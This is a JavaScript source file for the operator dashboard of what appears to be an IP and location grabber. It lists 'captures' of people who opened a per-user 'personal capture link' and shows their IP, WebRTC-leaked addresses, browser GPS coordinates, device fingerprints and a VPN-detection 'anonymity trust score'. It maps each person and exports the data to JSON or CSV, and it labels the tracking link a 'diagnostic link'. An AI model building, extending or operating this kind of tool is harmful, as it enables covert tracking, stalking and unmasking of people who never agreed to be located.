let map = null;
let markerLayers = [];
let captures = [];
let filteredCaptures = [];
let selectedId = null;
let currentView = 'devices';
let liveRefresh = true;
let expandedDevices = new Set();
let lastCapturesJSON = null;
let confirmResolver = null;

const ui = {};

function cacheElements() {
  [
    'listArea',
    'totalCaptures',
    'gpsCount',
    'deviceCount',
    'searchInput',
    'layerFilter',
    'sortSelect',
    'mapOverlay',
    'detailEmpty',
    'detailContent',
    'detailId',
    'detailDeviceBadge',
    'detailTime',
    'layerStatus',
    'detailSections',
    'toast',
    'liveBadge',
    'liveToggle',
    'confirmBackdrop',
    'confirmModal',
    'confirmTitle',
    'confirmText',
    'personalLinkInput'
  ].forEach((id) => {
    ui[id] = document.getElementById(id);
  });
}

document.addEventListener('DOMContentLoaded', async () => {
  cacheElements();
  bindEvents();
  initMap();
  fetchUserInfo();
  await loadCaptures({ force: true, fit: true });
  setInterval(() => {
    if (liveRefresh) loadCaptures();
  }, 3000);
});

function initMap() {
  if (!window.L) {
    ui.mapOverlay.classList.remove('hidden');
    ui.mapOverlay.querySelector('strong').textContent = 'Map library unavailable';
    ui.mapOverlay.querySelector('span').textContent = 'Capture management still works from the sidebar.';
    return;
  }

  map = L.map('map', {
    center: [30.5, 47.8],
    zoom: 5,
    zoomControl: false,
    attributionControl: false,
  });

  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
    maxZoom: 19,
    subdomains: 'abcd',
  }).addTo(map);

  L.control.zoom({ position: 'topright' }).addTo(map);
  setTimeout(() => map.invalidateSize(), 200);
  window.addEventListener('resize', () => map.invalidateSize());
}

function bindEvents() {
  document.addEventListener('click', async (event) => {
    const viewButton = event.target.closest('[data-view]');
    if (viewButton) {
      setView(viewButton.dataset.view);
      return;
    }

    const action = event.target.closest('[data-action]')?.dataset.action;
    if (!action) return;

    if (action === 'copy-link') copyText(location.origin, 'Diagnostic link copied.');
    if (action === 'export-json') exportJSON();
    if (action === 'export-csv') exportCSV();
    if (action === 'refresh') loadCaptures({ force: true, fit: false, notify: true });
    if (action === 'seed-demo') seedDemoCapture();
    if (action === 'clear-all') clearAll();
    if (action === 'fit-map') fitMapToCaptures();
    if (action === 'latest') selectLatest();
    if (action === 'toggle-live') toggleLive();
    if (action === 'delete-selected') deleteSelectedCapture();
    if (action === 'copy-selected') copySelectedDetails();
    if (action === 'cancel-confirm') resolveConfirm(false);
    if (action === 'confirm-action') resolveConfirm(true);
  });

  ui.searchInput.addEventListener('input', () => applyFiltersAndRender());
  ui.layerFilter.addEventListener('change', () => applyFiltersAndRender());
  ui.sortSelect.addEventListener('change', () => applyFiltersAndRender());

  ui.listArea.addEventListener('click', (event) => {
    const deleteButton = event.target.closest('[data-delete-capture]');
    if (deleteButton) {
      event.stopPropagation();
      deleteCapture(deleteButton.dataset.deleteCapture);
      return;
    }

    const deleteDeviceButton = event.target.closest('[data-delete-device]');
    if (deleteDeviceButton) {
      event.stopPropagation();
      deleteDevice(deleteDeviceButton.dataset.deleteDevice);
      return;
    }

    const captureItem = event.target.closest('[data-capture-id]');
    if (captureItem) {
      selectCapture(captureItem.dataset.captureId);
      return;
    }

    const deviceHeader = event.target.closest('[data-device-id]');
    if (deviceHeader) {
      toggleDevice(deviceHeader.dataset.deviceId);
    }
  });

  ui.listArea.addEventListener('keydown', (event) => {
    if (event.key !== 'Enter' && event.key !== ' ') return;

    const actionable = event.target.closest('[data-capture-id], [data-device-id], [data-delete-capture], [data-delete-device]');
    if (!actionable) return;

    event.preventDefault();
    actionable.click();
  });
}

async function fetchUserInfo() {
  try {
    const resp = await fetch('/api/health');
    const data = await resp.json();
    if (data.user) {
      const url = `${location.origin}/?ref=${data.user}`;
      ui.personalLinkInput.value = url;
    }
  } catch (err) {
    ui.personalLinkInput.value = 'Error loading link';
  }
}

function copyPersonalLink() {
  const url = ui.personalLinkInput.value;
  if (!url || url.includes('...')) return;
  copyText(url, 'Personal capture link copied.');
}

async function loadCaptures(options = {}) {
  try {
    const response = await fetch('/api/captures', { cache: 'no-store' });
    if (!response.ok) throw new Error('Could not fetch captures');

    const nextCaptures = (await response.json()).map(normalizeCapture);
    const nextJSON = JSON.stringify(nextCaptures);

    if (!options.force && nextJSON === lastCapturesJSON) return;

    const hadNoData = captures.length === 0;
    captures = nextCaptures;
    lastCapturesJSON = nextJSON;
    applyFiltersAndRender({ fit: options.fit || hadNoData });

    if (selectedId) {
      const selected = captures.find((capture) => capture.id === selectedId);
      if (selected) {
        renderDetail(selected);
      } else {
        clearSelection();
      }
    }

    if (options.notify) showToast('Dashboard refreshed.');
  } catch (err) {
    console.warn('Dashboard fetch error (likely serverless cold start):', err);
  }
}

function normalizeCapture(capture) {
  return {
    id: String(capture.id || ''),
    deviceId: String(capture.deviceId || 'unknown'),
    timestamp: capture.timestamp || new Date().toISOString(),
    ip: capture.ip || 'unknown',
    ipGeo: capture.ipGeo || {},
    webrtcIPs: Array.isArray(capture.webrtcIPs) ? capture.webrtcIPs : [],
    gps: capture.gps || null,
    fingerprint: capture.fingerprint || {},
    visitCount: Number(capture.visitCount) || 1,
  };
}

function applyFiltersAndRender(options = {}) {
  filteredCaptures = sortCaptures(filterCaptures(captures));
  renderStats();
  renderList();
  renderMap(options.fit);
}

function filterCaptures(items) {
  const query = ui.searchInput.value.trim().toLowerCase();
  const layer = ui.layerFilter.value;

  return items.filter((capture) => {
    const matchesLayer =
      layer === 'all' ||
      (layer === 'gps' && capture.gps) ||
      (layer === 'ip' && !capture.gps && hasIPLocation(capture)) ||
      (layer === 'webrtc' && capture.webrtcIPs.length > 0) ||
      (layer === 'nogps' && !capture.gps);

    if (!matchesLayer) return false;
    if (!query) return true;

    const haystack = [
      capture.id,
      capture.deviceId,
      capture.ip,
      capture.ipGeo.city,
      capture.ipGeo.region,
      capture.ipGeo.country,
      capture.ipGeo.isp,
      capture.fingerprint.platform,
      capture.fingerprint.userAgent,
      ...(capture.webrtcIPs || []),
    ].join(' ').toLowerCase();

    return haystack.includes(query);
  });
}

function sortCaptures(items) {
  const sort = ui.sortSelect.value;
  const sorted = [...items];

  if (sort === 'oldest') {
    sorted.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
  } else if (sort === 'gps-accuracy') {
    sorted.sort((a, b) => (a.gps?.accuracy ?? Infinity) - (b.gps?.accuracy ?? Infinity));
  } else if (sort === 'visits') {
    sorted.sort((a, b) => (b.visitCount || 0) - (a.visitCount || 0));
  } else {
    sorted.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
  }

  return sorted;
}

function renderStats() {
  ui.totalCaptures.textContent = captures.length;
  ui.gpsCount.textContent = captures.filter((capture) => capture.gps).length;
  ui.deviceCount.textContent = new Set(captures.map((capture) => capture.deviceId)).size;
}

function setView(view) {
  currentView = view;
  document.querySelectorAll('[data-view]').forEach((button) => {
    button.classList.toggle('active', button.dataset.view === view);
  });
  renderList();
}

function renderList() {
  if (!filteredCaptures.length) {
    ui.listArea.innerHTML = `
      <div class="empty-list">
        <div>
          <strong>No captures match this view</strong>
          <span>Adjust filters, refresh, or add a demo capture.</span>
        </div>
      </div>
    `;
    return;
  }

  if (currentView === 'devices') {
    ui.listArea.innerHTML = groupByDevice(filteredCaptures).map(([deviceId, items]) => {
      const latest = getLatest(items);
      const device = parseDevice(latest.fingerprint.userAgent);
      const isExpanded = expandedDevices.has(deviceId);
      const isActive = selectedId && items.some((capture) => capture.id === selectedId);
      const gpsCount = items.filter((capture) => capture.gps).length;

      return `
        <article class="device-group">
          <div class="device-header ${isActive ? 'active' : ''}" role="button" tabindex="0" data-device-id="${attr(deviceId)}">
            <span class="device-icon ${device.type}" aria-hidden="true">${device.icon}</span>
            <span class="device-info">
              <span class="device-name">${escapeHTML(device.name)}</span>
              <span class="device-meta">${escapeHTML(shortId(deviceId))} / ${escapeHTML(latest.ip)}</span>
            </span>
            <span class="device-badges">
              <span class="badge">${items.length}</span>
              <span class="badge gps">${gpsCount}</span>
              <button class="delete-inline" type="button" data-delete-device="${attr(deviceId)}" title="Delete device" aria-label="Delete device">
                ${iconTrash()}
              </button>
            </span>
          </div>
          ${isExpanded ? `<div class="device-captures">${sortCaptures(items).map(captureItemHTML).join('')}</div>` : ''}
        </article>
      `;
    }).join('');
  } else {
    ui.listArea.innerHTML = filteredCaptures.map(captureItemHTML).join('');
  }
}

function groupByDevice(items) {
  const groups = new Map();

  items.forEach((capture) => {
    if (!groups.has(capture.deviceId)) groups.set(capture.deviceId, []);
    groups.get(capture.deviceId).push(capture);
  });

  return [...groups.entries()].sort((a, b) => new Date(getLatest(b[1]).timestamp) - new Date(getLatest(a[1]).timestamp));
}

function captureItemHTML(capture) {
  const isActive = capture.id === selectedId;
  const time = new Date(capture.timestamp);
  const location = capture.gps
    ? `${formatCoord(capture.gps.lat)}, ${formatCoord(capture.gps.lon)}`
    : capture.ipGeo.city || capture.ip;

  return `
    <div class="capture-item ${isActive ? 'active' : ''}" role="button" tabindex="0" data-capture-id="${attr(capture.id)}">
      <span class="capture-dot ${capture.gps ? 'has-gps' : ''}" aria-hidden="true"></span>
      <span class="capture-info">
        <span class="capture-id">${escapeHTML(capture.id)}</span>
        <span class="capture-sub">${escapeHTML(location || 'Unknown location')}</span>
      </span>
      <span class="capture-layers" aria-label="Capture layers">
        <i class="layer-pip ip" title="IP"></i>
        <i class="layer-pip ${capture.webrtcIPs.length ? 'webrtc' : 'off'}" title="WebRTC"></i>
        <i class="layer-pip ${capture.gps ? 'gps' : 'off'}" title="GPS"></i>
      </span>
      <span class="time-label">${escapeHTML(time.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }))}</span>
      <button class="delete-inline" type="button" data-delete-capture="${attr(capture.id)}" title="Delete capture" aria-label="Delete capture">
        ${iconTrash()}
      </button>
    </div>
  `;
}

function toggleDevice(deviceId) {
  if (expandedDevices.has(deviceId)) {
    expandedDevices.delete(deviceId);
  } else {
    expandedDevices.add(deviceId);
  }
  renderList();
}

function renderMap(shouldFit = false) {
  if (!map) return;

  markerLayers.forEach((layer) => map.removeLayer(layer));
  markerLayers = [];

  const plotted = [];

  filteredCaptures.forEach((capture) => {
    const loc = getCaptureLocation(capture);
    if (!loc) return;

    const color = capture.id === selectedId ? '#ff7b7b' : loc.source === 'gps' ? '#95f0c0' : '#8bb8ff';
    const size = capture.id === selectedId ? 15 : loc.source === 'gps' ? 12 : 10;
    const device = parseDevice(capture.fingerprint.userAgent);
    const marker = L.marker([loc.lat, loc.lon], {
      icon: L.divIcon({
        className: '',
        html: `<button class="map-marker" style="width:${size}px;height:${size}px;background:${color};box-shadow:0 0 0 5px ${hexToRgba(color, 0.14)},0 0 24px ${hexToRgba(color, 0.32)}" aria-label="Map marker"></button>`,
        iconSize: [size, size],
        iconAnchor: [size / 2, size / 2],
      }),
    }).addTo(map);

    marker.bindPopup(`
      <div class="popup-label">${escapeHTML(device.name)} / ${escapeHTML(capture.id)}</div>
      <div class="popup-coords">${formatCoord(loc.lat)}, ${formatCoord(loc.lon)}</div>
      <div class="popup-meta">${loc.source.toUpperCase()} / ${escapeHTML(capture.ipGeo.city || capture.ip || 'Unknown')}</div>
    `);
    marker.on('click', () => selectCapture(capture.id));
    markerLayers.push(marker);
    plotted.push([loc.lat, loc.lon]);

    if (capture.gps?.accuracy) {
      const circle = L.circle([loc.lat, loc.lon], {
        radius: capture.gps.accuracy,
        color,
        fillColor: color,
        fillOpacity: 0.07,
        weight: 1,
        opacity: 0.3,
      }).addTo(map);
      markerLayers.push(circle);
    }
  });

  ui.mapOverlay.classList.toggle('hidden', plotted.length > 0);

  if (shouldFit && plotted.length > 0) {
    map.fitBounds(plotted, { padding: [54, 54], maxZoom: 15 });
  }
}

function selectCapture(id) {
  selectedId = id;
  const capture = captures.find((item) => item.id === id);
  if (!capture) return;

  renderDetail(capture);
  renderList();
  renderMap(false);

  const loc = getCaptureLocation(capture);
  if (loc && map) {
    map.setView([loc.lat, loc.lon], loc.source === 'gps' ? 16 : 10, { animate: true });
  }
}

function selectLatest() {
  const latest = filteredCaptures[0] || sortCaptures(captures)[0];
  if (!latest) {
    showToast('There is no capture to select.');
    return;
  }
  selectCapture(latest.id);
}

function clearSelection() {
  selectedId = null;
  ui.detailEmpty.classList.remove('hidden');
  ui.detailContent.classList.add('hidden');
  renderList();
  renderMap(false);
}

function renderDetail(capture) {
  ui.detailEmpty.classList.add('hidden');
  ui.detailContent.classList.remove('hidden');

  const siblings = captures
    .filter((item) => item.deviceId === capture.deviceId)
    .sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
  const visitIndex = Math.max(0, siblings.findIndex((item) => item.id === capture.id)) + 1;

  ui.detailId.textContent = capture.id;
  ui.detailDeviceBadge.textContent = `Visit ${visitIndex}/${siblings.length} / ${shortId(capture.deviceId)}`;
  ui.detailTime.textContent = new Date(capture.timestamp).toLocaleString();
  ui.layerStatus.innerHTML = `
    <span class="layer-chip ok"><i class="chip-dot"></i>IP captured</span>
    <span class="layer-chip ${capture.webrtcIPs.length ? 'warn' : ''}"><i class="chip-dot"></i>WebRTC ${capture.webrtcIPs.length ? 'visible' : 'blocked'}</span>
    <span class="layer-chip ${capture.gps ? 'ok' : ''}"><i class="chip-dot"></i>GPS ${capture.gps ? 'available' : 'missing'}</span>
  `;

  const ipGeo = capture.ipGeo || {};
  const fp = capture.fingerprint || {};
  const loc = getCaptureLocation(capture);
  const rows = [];

  rows.push(section('IP geolocation', iconGlobe(), [
    row('IP address', capture.ip),
    row('City', ipGeo.city),
    row('Region', ipGeo.region),
    row('Country', ipGeo.country),
    row('ISP', ipGeo.isp),
    row('ASN', ipGeo.asn),
    row('Coordinates', hasIPLocation(capture) ? `${formatCoord(ipGeo.lat)}, ${formatCoord(ipGeo.lon)}` : null, hasIPLocation(capture) ? 'good' : ''),
  ]));

  rows.push(section('WebRTC', iconUnlock(), capture.webrtcIPs.length
    ? capture.webrtcIPs.map((ip, index) => row(`Candidate ${index + 1}`, ip, 'warn'))
    : [rowEmpty('No WebRTC candidate was exposed by this browser')]
  ));

  if (capture.gps) {
    rows.push(section('Browser GPS', iconPin(), [
      row('Latitude', formatCoord(capture.gps.lat), 'good'),
      row('Longitude', formatCoord(capture.gps.lon), 'good'),
      row('Accuracy', `${Math.round(capture.gps.accuracy || 0)} meters`),
      row('Altitude', capture.gps.altitude != null ? `${Number(capture.gps.altitude).toFixed(1)} m` : null),
      row('Speed', capture.gps.speed != null ? `${Number(capture.gps.speed).toFixed(1)} m/s` : null),
      row('Heading', capture.gps.heading != null ? `${Number(capture.gps.heading).toFixed(1)} deg` : null),
      rowLink('Maps', `https://maps.google.com/?q=${capture.gps.lat},${capture.gps.lon}`, 'Open Google Maps'),
    ]));
  } else {
    rows.push(section('Browser GPS', iconPin(), [rowEmpty('Location permission was denied, skipped, or unavailable')]));
  }

  rows.push(section('Device fingerprint', iconMonitor(), [
    row('Device type', parseDevice(fp.userAgent).name),
    row('User agent', fp.userAgent),
    row('Platform', fp.platform),
    row('Language', fp.language),
    row('Screen', fp.screenRes),
    row('Timezone', fp.timezone),
    row('CPU cores', fp.cores || null),
    row('Memory', fp.memory ? `${fp.memory} GB` : null),
    row('GPU', fp.gpu),
    row('Touch', fp.touchSupport ? 'Yes' : 'No'),
    row('Connection', fp.connectionType),
  ]));

  const deviceTz = fp.timezone;
  const ipTz = ipGeo.timezone;
  
  let vpnSus = false;
  let vpnReason = [];
  if (deviceTz && ipTz && deviceTz !== '-' && ipTz !== '-' && deviceTz !== ipTz) {
    vpnSus = true;
    vpnReason.push(`Timezone mismatch (Device: ${deviceTz} vs IP: ${ipTz})`);
  }

  let trustScore = 100;
  if (vpnSus) trustScore -= 40;
  if (!capture.webrtcIPs || capture.webrtcIPs.length === 0) trustScore -= 20;
  if (!capture.gps) trustScore -= 20;
  if (!fp.canvas) trustScore -= 10;
  if (fp.userAgent && fp.userAgent.includes('Headless')) trustScore -= 30;

  trustScore = Math.max(0, trustScore);

  let trustColor = 'good';
  if (trustScore < 50) trustColor = 'warn'; 
  else if (trustScore < 80) trustColor = 'warn';

  rows.push(section('Advanced Tracking & Anonymity', iconMonitor(), [
    row('Anonymity Trust Score', `${trustScore}%`, trustColor),
    row('VPN / Proxy Risk', vpnSus ? 'High Suspicion' : 'Low', vpnSus ? 'warn' : 'good'),
    ...(vpnSus ? [row('Suspicion Reason', vpnReason.join(', '))] : []),
    row('Canvas Hash', fp.canvas ? `${fp.canvas.slice(0, 20)}...` : '-'),
    row('Audio Hash', fp.audioFingerprint || '-'),
  ]));

  rows.push(section('Actions', iconClipboard(), [
    loc ? rowLink('Coordinates', `https://maps.google.com/?q=${loc.lat},${loc.lon}`, 'Open selected point') : rowEmpty('No map coordinates available for this capture'),
    row('Device ID', capture.deviceId),
    row('Visit count', capture.visitCount),
  ]));

  ui.detailSections.innerHTML = rows.join('');
}

function section(title, icon, rows) {
  return `
    <section class="section">
      <header class="section-head">${icon}<span>${escapeHTML(title)}</span></header>
      <div class="section-body">${rows.join('')}</div>
    </section>
  `;
}

function row(key, value, className = '') {
  return `
    <div class="data-row">
      <span class="data-key">${escapeHTML(key)}</span>
      <span class="data-val ${className}">${escapeHTML(value || '—')}</span>
    </div>
  `;
}

function rowEmpty(text) {
  return `<div class="data-row"><span class="data-val dim">${escapeHTML(text)}</span></div>`;
}

function rowLink(key, href, label) {
  return `
    <div class="data-row">
      <span class="data-key">${escapeHTML(key)}</span>
      <span class="data-val"><a href="${attr(href)}" target="_blank" rel="noreferrer">${escapeHTML(label)}</a></span>
    </div>
  `;
}

async function seedDemoCapture() {
  try {
    const response = await fetch('/api/demo-capture', { method: 'POST' });
    if (!response.ok) throw new Error('Demo capture failed');
    const { id } = await response.json().catch(() => ({}));
    await loadCaptures({ force: true, fit: true });
    if (id) selectCapture(id);
    showToast('Demo capture added.');
  } catch {
    showToast('Could not add a demo capture.');
  }
}

async function clearAll() {
  const ok = await confirmAction('Clear all captures?', 'This removes every stored capture from data/captures.json. This cannot be undone.');
  if (!ok) return;

  try {
    const response = await fetch('/api/captures', { method: 'DELETE' });
    if (!response.ok) throw new Error('Clear failed');
    expandedDevices.clear();
    clearSelection();
    await loadCaptures({ force: true, fit: true });
    showToast('All captures cleared.');
  } catch {
    showToast('Could not clear captures.');
  }
}

async function deleteSelectedCapture() {
  if (!selectedId) return;
  await deleteCapture(selectedId);
}

async function deleteCapture(id) {
  const ok = await confirmAction('Delete this capture?', `Capture ${id} will be removed from the local dashboard.`);
  if (!ok) return;

  try {
    const response = await fetch(`/api/captures/${encodeURIComponent(id)}`, { method: 'DELETE' });
    const payload = await response.json().catch(() => ({}));
    if (!response.ok) throw new Error(payload.error || 'Delete failed');
    if (selectedId === id) selectedId = null;
    await loadCaptures({ force: true, fit: false });
    if (!selectedId) clearSelection();
    showToast('Capture deleted.');
  } catch (error) {
    showToast(`Could not delete capture: ${error.message}`);
  }
}

async function deleteDevice(deviceId) {
  const items = captures.filter((capture) => capture.deviceId === deviceId);
  const ok = await confirmAction('Delete this device?', `${items.length} capture(s) for ${shortId(deviceId)} will be removed.`);
  if (!ok) return;

  try {
    const response = await fetch(`/api/devices/${encodeURIComponent(deviceId)}`, { method: 'DELETE' });
    const payload = await response.json().catch(() => ({}));
    if (!response.ok) throw new Error(payload.error || 'Delete device failed');
    expandedDevices.delete(deviceId);
    if (items.some((capture) => capture.id === selectedId)) selectedId = null;
    await loadCaptures({ force: true, fit: false });
    if (!selectedId) clearSelection();
    showToast('Device captures deleted.');
  } catch (error) {
    showToast(`Could not delete device: ${error.message}`);
  }
}

function exportJSON() {
  if (!captures.length) {
    showToast('There is no data to export.');
    return;
  }
  downloadBlob(JSON.stringify(filteredCaptures, null, 2), `ig_captures_${timestampSlug()}.json`, 'application/json');
  showToast('JSON export started.');
}

function exportCSV() {
  if (!captures.length) {
    showToast('There is no data to export.');
    return;
  }

  const header = ['id', 'deviceId', 'timestamp', 'ip', 'city', 'country', 'gpsLat', 'gpsLon', 'gpsAccuracy', 'webrtcIPs', 'platform', 'timezone', 'visitCount'];
  const lines = [header.join(',')];

  filteredCaptures.forEach((capture) => {
    const rowValues = [
      capture.id,
      capture.deviceId,
      capture.timestamp,
      capture.ip,
      capture.ipGeo.city,
      capture.ipGeo.country,
      capture.gps?.lat,
      capture.gps?.lon,
      capture.gps?.accuracy,
      capture.webrtcIPs.join(' | '),
      capture.fingerprint.platform,
      capture.fingerprint.timezone,
      capture.visitCount,
    ];
    lines.push(rowValues.map(csvEscape).join(','));
  });

  downloadBlob(lines.join('\n'), `ig_captures_${timestampSlug()}.csv`, 'text/csv');
  showToast('CSV export started.');
}

function copySelectedDetails() {
  const capture = captures.find((item) => item.id === selectedId);
  if (!capture) {
    showToast('Select a capture first.');
    return;
  }

  const loc = getCaptureLocation(capture);
  const text = [
    `Capture: ${capture.id}`,
    `Device: ${capture.deviceId}`,
    `Time: ${new Date(capture.timestamp).toLocaleString()}`,
    `IP: ${capture.ip}`,
    `City: ${capture.ipGeo.city || '-'}`,
    `GPS: ${capture.gps ? `${formatCoord(capture.gps.lat)}, ${formatCoord(capture.gps.lon)} (${Math.round(capture.gps.accuracy || 0)}m)` : 'not available'}`,
    `Map: ${loc ? `https://maps.google.com/?q=${loc.lat},${loc.lon}` : 'not available'}`,
  ].join('\n');

  copyText(text, 'Capture details copied.');
}

function toggleLive() {
  liveRefresh = !liveRefresh;
  ui.liveBadge.textContent = liveRefresh ? 'Live' : 'Paused';
  ui.liveBadge.classList.toggle('paused', !liveRefresh);
  ui.liveToggle.innerHTML = liveRefresh
    ? `${iconPause()} Pause`
    : `${iconPlay()} Resume`;
  showToast(liveRefresh ? 'Live refresh resumed.' : 'Live refresh paused.');
}

function fitMapToCaptures() {
  const plotted = filteredCaptures.map(getCaptureLocation).filter(Boolean).map((loc) => [loc.lat, loc.lon]);
  if (!map || !plotted.length) {
    showToast('There are no mapped captures in this view.');
    return;
  }
  map.fitBounds(plotted, { padding: [54, 54], maxZoom: 15 });
}

function getCaptureLocation(capture) {
  if (capture.gps && isFiniteCoord(capture.gps.lat, capture.gps.lon)) {
    return { lat: Number(capture.gps.lat), lon: Number(capture.gps.lon), source: 'gps' };
  }

  if (hasIPLocation(capture)) {
    return { lat: Number(capture.ipGeo.lat), lon: Number(capture.ipGeo.lon), source: 'ip' };
  }

  return null;
}

function hasIPLocation(capture) {
  return isFiniteCoord(capture.ipGeo?.lat, capture.ipGeo?.lon) && Number(capture.ipGeo.lat) !== 0 && Number(capture.ipGeo.lon) !== 0;
}

function isFiniteCoord(lat, lon) {
  return Number.isFinite(Number(lat)) && Number.isFinite(Number(lon));
}

function parseDevice(userAgent = '') {
  const ua = userAgent || '';
  const isMobile = /mobile|android|iphone|ipad|ipod/i.test(ua);
  let name = 'Unknown device';

  if (/iPhone/i.test(ua)) name = 'iPhone';
  else if (/iPad/i.test(ua)) name = 'iPad';
  else if (/Samsung/i.test(ua)) name = 'Samsung';
  else if (/Pixel/i.test(ua)) name = 'Pixel';
  else if (/Huawei/i.test(ua)) name = 'Huawei';
  else if (/Xiaomi|Redmi/i.test(ua)) name = 'Xiaomi';
  else if (/OPPO/i.test(ua)) name = 'OPPO';
  else if (/Android/i.test(ua)) name = 'Android';
  else if (/Macintosh|Mac OS/i.test(ua)) name = 'Mac';
  else if (/Windows/i.test(ua)) name = 'Windows PC';
  else if (/Linux/i.test(ua)) name = 'Linux';

  return {
    type: isMobile ? 'mobile' : 'desktop',
    name,
    icon: isMobile ? iconPhone() : iconDesktop(),
  };
}

function getLatest(items) {
  return [...items].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0];
}

function confirmAction(title, text) {
  ui.confirmTitle.textContent = title;
  ui.confirmText.textContent = text;
  ui.confirmBackdrop.classList.remove('hidden');
  ui.confirmModal.classList.remove('hidden');

  return new Promise((resolve) => {
    confirmResolver = resolve;
  });
}

function resolveConfirm(value) {
  ui.confirmBackdrop.classList.add('hidden');
  ui.confirmModal.classList.add('hidden');
  if (confirmResolver) confirmResolver(value);
  confirmResolver = null;
}

function downloadBlob(content, filename, type) {
  const blob = new Blob([content], { type });
  const url = URL.createObjectURL(blob);
  const anchor = document.createElement('a');
  anchor.href = url;
  anchor.download = filename;
  document.body.appendChild(anchor);
  anchor.click();
  anchor.remove();
  URL.revokeObjectURL(url);
}

async function copyText(text, successMessage) {
  try {
    if (navigator.clipboard && window.isSecureContext) {
      await navigator.clipboard.writeText(text);
    } else {
      const textarea = document.createElement('textarea');
      textarea.value = text;
      textarea.setAttribute('readonly', '');
      textarea.style.position = 'fixed';
      textarea.style.opacity = '0';
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      textarea.remove();
    }
    showToast(successMessage);
  } catch {
    showToast('Clipboard permission was blocked.');
  }
}

function showToast(message) {
  ui.toast.textContent = message;
  ui.toast.classList.add('show');
  clearTimeout(showToast.timer);
  showToast.timer = setTimeout(() => ui.toast.classList.remove('show'), 2600);
}

function escapeHTML(value) {
  const span = document.createElement('span');
  span.textContent = String(value ?? '');
  return span.innerHTML;
}

function attr(value) {
  return escapeHTML(value).replace(/"/g, '&quot;');
}

function csvEscape(value) {
  const str = String(value ?? '');
  return `"${str.replace(/"/g, '""')}"`;
}

function shortId(value) {
  const text = String(value || 'unknown');
  return text.length > 16 ? `${text.slice(0, 16)}` : text;
}

function formatCoord(value) {
  return Number(value).toFixed(6);
}

function timestampSlug() {
  return new Date().toISOString().replace(/[:.]/g, '-');
}

function hexToRgba(hex, alpha) {
  const clean = hex.replace('#', '');
  const value = parseInt(clean, 16);
  const red = (value >> 16) & 255;
  const green = (value >> 8) & 255;
  const blue = value & 255;
  return `rgba(${red},${green},${blue},${alpha})`;
}

function iconTrash() {
  return '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M3 6h18"/><path d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>';
}

function iconPhone() {
  return '<svg viewBox="0 0 24 24" aria-hidden="true"><rect x="7" y="2" width="10" height="20" rx="2"/><path d="M11 18h2"/></svg>';
}

function iconDesktop() {
  return '<svg viewBox="0 0 24 24" aria-hidden="true"><rect x="4" y="5" width="16" height="11" rx="2"/><path d="M9 20h6M12 16v4"/></svg>';
}

function iconPause() {
  return '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M6 4v16M18 4v16"/></svg>';
}

function iconPlay() {
  return '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M7 4l12 8-12 8z"/></svg>';
}

function iconGlobe() {
  return '<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15 15 0 0 1 4 10 15 15 0 0 1-4 10 15 15 0 0 1-4-10 15 15 0 0 1 4-10z"/></svg>';
}

function iconUnlock() {
  return '<svg viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></svg>';
}

function iconPin() {
  return '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M21 10c0 7-9 13-9 13S3 17 3 10a9 9 0 1 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>';
}

function iconMonitor() {
  return '<svg viewBox="0 0 24 24" aria-hidden="true"><rect x="4" y="5" width="16" height="11" rx="2"/><path d="M9 20h6M12 16v4"/></svg>';
}

function iconClipboard() {
  return '<svg viewBox="0 0 24 24" aria-hidden="true"><rect x="8" y="4" width="8" height="4" rx="1"/><path d="M16 6h2a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h2"/></svg>';
}
